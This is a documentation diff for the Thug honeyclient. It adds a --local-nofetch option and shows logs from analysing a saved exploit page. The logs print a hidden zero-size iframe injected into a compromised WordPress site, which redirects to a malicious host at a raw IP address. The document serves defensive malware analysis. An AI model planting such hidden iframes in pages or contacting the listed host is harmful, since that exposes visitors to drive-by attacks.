@@ -32,7 +32,8 @@ Let's start our Thug tour by taking a look at the options it provides.
         -o, --output=       	Log to a specified file
         -r, --referer=      	Specify a referer
         -p, --proxy=        	Specify a proxy (see below for format and supported schemes)
-        -l, --local
+        -l, --local             Analyze a locally saved page
+        -x, --local-nofetch     Analyze a locally saved page and prevent remote content fetching
         -v, --verbose       	Enable verbose mode
         -d, --debug         	Enable debug mode
         -q, --quiet         	Disable console logging
@@ -718,6 +719,67 @@ later (manual or automated) analysis (see also *Web Cache*)
 
         [2012-07-03 00:12:23] Saving log analysis at ../logs/c8f4c752383eb87ac4381a4f3f101ca7/20120703001222
 
+If you need to prevent remote content fetching while analyzing a locally saved page Thug
+provides the *-x (--local-nofetch)* option to you. Let's take a look at an example.
+
+.. code-block:: sh
+
+    ~/thug/src $ python thug.py -l ../samples/exploits/55875.html 
+    [2013-01-08 10:32:28] <meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+    [2013-01-08 10:32:28] <meta content="Acer Inc.'s shares fell sharply Tuesday, one day after the Taiwanese computer maker said it would acquire Gateway Inc. for $710 million.  Acer said it ..." name="description"/>
+    [2013-01-08 10:32:28] <meta content="index,follow" name="robots"/>
+    [2013-01-08 10:32:28] <meta content="Copyright (c)2007-2007 groundhogtech.com. All right reserved." name="copyright"/>
+    [2013-01-08 10:32:28] <meta content="WordPress 2.2.1" name="generator"/>
+    [2013-01-08 10:32:28] [Meta] Generator: WordPress 2.2.1
+    [2013-01-08 10:32:28] <meta content="document" name="resource-type"/>
+    [2013-01-08 10:32:28] <link href="http://www.groundhogtech.com/favicon.ico" rel="shortcut icon"/>
+    [2013-01-08 10:32:28] [HTTP] URL: http://www.groundhogtech.com/favicon.ico (Status: 204, Referrer: None)
+    [2013-01-08 10:32:28] [HTTP] URL: http://www.groundhogtech.com/favicon.ico (Content-type: text/plain; charset=UTF-8, MD5: d41d8cd98f00b204e9800998ecf8427e)
+    [2013-01-08 10:32:28] <link href="http://www.groundhogtech.com/wp-content/themes/ad-flex-niche/skins/default/skin.css" media="screen" rel="stylesheet" type="text/css"/>
+    [2013-01-08 10:32:29] [HTTP] URL: http://www.groundhogtech.com/wp-content/themes/ad-flex-niche/skins/default/skin.css (Status: 200, Referrer: None)
+    [2013-01-08 10:32:29] [HTTP] URL: http://www.groundhogtech.com/wp-content/themes/ad-flex-niche/skins/default/skin.css (Content-type: text/html; charset=UTF-8, MD5: 64f3fd00b16de9316bf2b7b57925f4ca)
+    [2013-01-08 10:32:29] <link href="http://www.groundhogtech.com/feed/" rel="alternate" title="Groundhogtech RSS Feed" type="application/rss+xml"/>
+    [2013-01-08 10:32:30] [HTTP] URL: http://www.groundhogtech.com/feed/ (Status: 200, Referrer: None)
+    [2013-01-08 10:32:30] [HTTP] URL: http://www.groundhogtech.com/feed/ (Content-type: text/html; charset=UTF-8, MD5: 0f3dffbe75d901cf28d63f2e8c945815)
+    [2013-01-08 10:32:30] <link href="http://www.groundhogtech.com/xmlrpc.php" rel="pingback"/>
+    [2013-01-08 10:32:30] [HTTP] URL: http://www.groundhogtech.com/xmlrpc.php (Status: 200, Referrer: None)
+    [2013-01-08 10:32:30] [HTTP] URL: http://www.groundhogtech.com/xmlrpc.php (Content-type: text/html; charset=UTF-8, MD5: ce1ec1253cf77acb1a86d38c80a83ca2)
+    [2013-01-08 10:32:30] <link href="http://www.groundhogtech.com/xmlrpc.php?rsd" rel="EditURI" title="RSD" type="application/rsd+xml"/>
+    [2013-01-08 10:32:31] [HTTP] URL: http://www.groundhogtech.com/xmlrpc.php?rsd (Status: 200, Referrer: None)
+    [2013-01-08 10:32:31] [HTTP] URL: http://www.groundhogtech.com/xmlrpc.php?rsd (Content-type: text/html; charset=UTF-8, MD5: d178bfd11bc1b88fc37be47b515210eb)
+    [2013-01-08 10:32:31] [HTTP] URL: http://www.vklabs.com/wordpress-themes/show-version-xhtml-ad-flex-niche.php?version=0.8.9.8h (Status: 200, Referrer: None)
+    [2013-01-08 10:32:31] [HTTP] URL: http://www.vklabs.com/wordpress-themes/show-version-xhtml-ad-flex-niche.php?version=0.8.9.8h (Content-type: text/html, MD5: cd382dd315e1c83a108dd8009bad9f70)
+    [2013-01-08 10:32:32] <iframe frameborder="0" height="0" marginheight="0" marginwidth="0" scrolling="no" src="http://81.95.149.27/go.php?sid=1" style="border:0px solid gray;" width="0"></iframe>
+    [2013-01-08 10:32:32] [iframe redirection] about:blank -> http://81.95.149.27/go.php?sid=1
+    [2013-01-08 10:32:42] [HTTP] URL: http://81.95.149.27/go.php?sid=1 (Status: 408, Referrer: None)
+    [2013-01-08 10:32:42] [Request Timeout] URL: http://81.95.149.27/go.php?sid=1
+    [2013-01-08 10:32:42] <iframe frameborder="0" height="0" marginheight="0" marginwidth="0" scrolling="no" src="http://81.95.149.27/go.php?sid=1" style="border:0px solid gray;" width="0"></iframe>
+    [2013-01-08 10:32:42] [iframe redirection] about:blank -> http://81.95.149.27/go.php?sid=1
+    [2013-01-08 10:32:52] [HTTP] URL: http://81.95.149.27/go.php?sid=1 (Status: 408, Referrer: None)
+    [2013-01-08 10:32:52] [Request Timeout] URL: http://81.95.149.27/go.php?sid=1
+    [2013-01-08 10:32:53] Saving log analysis at ../logs/f31f8f54bf5daa0effb237ddc4ad3727/20130108103227
+
+This is what we expect. Let's prevent remote content fetching now while analyzing the same
+locally saved page.
+
+.. code-block:: sh
+
+    ~/thug/src $ python thug.py -x ../samples/exploits/55875.html 
+    [2013-01-08 10:33:00] <meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+    [2013-01-08 10:33:00] <meta content="Acer Inc.'s shares fell sharply Tuesday, one day after the Taiwanese computer maker said it would acquire Gateway Inc. for $710 million.  Acer said it ..." name="description"/>
+    [2013-01-08 10:33:00] <meta content="index,follow" name="robots"/>
+    [2013-01-08 10:33:00] <meta content="Copyright (c)2007-2007 groundhogtech.com. All right reserved." name="copyright"/>
+    [2013-01-08 10:33:00] <meta content="WordPress 2.2.1" name="generator"/>
+    [2013-01-08 10:33:00] [Meta] Generator: WordPress 2.2.1
+    [2013-01-08 10:33:00] <meta content="document" name="resource-type"/>
+    [2013-01-08 10:33:00] <link href="http://www.groundhogtech.com/favicon.ico" rel="shortcut icon"/>
+    [2013-01-08 10:33:00] <link href="http://www.groundhogtech.com/wp-content/themes/ad-flex-niche/skins/default/skin.css" media="screen" rel="stylesheet" type="text/css"/>
+    [2013-01-08 10:33:00] <link href="http://www.groundhogtech.com/feed/" rel="alternate" title="Groundhogtech RSS Feed" type="application/rss+xml"/>
+    [2013-01-08 10:33:00] <link href="http://www.groundhogtech.com/xmlrpc.php" rel="pingback"/>
+    [2013-01-08 10:33:01] <link href="http://www.groundhogtech.com/xmlrpc.php?rsd" rel="EditURI" title="RSD" type="application/rsd+xml"/>
+    [2013-01-08 10:33:01] <iframe frameborder="0" height="0" marginheight="0" marginwidth="0" scrolling="no" src="http://81.95.149.27/go.php?sid=1" style="border:0px solid gray;" width="0"></iframe>
+    [2013-01-08 10:33:01] Saving log analysis at ../logs/f31f8f54bf5daa0effb237ddc4ad3727/20130108103259
+ 
 
 Web Cache
 ---------
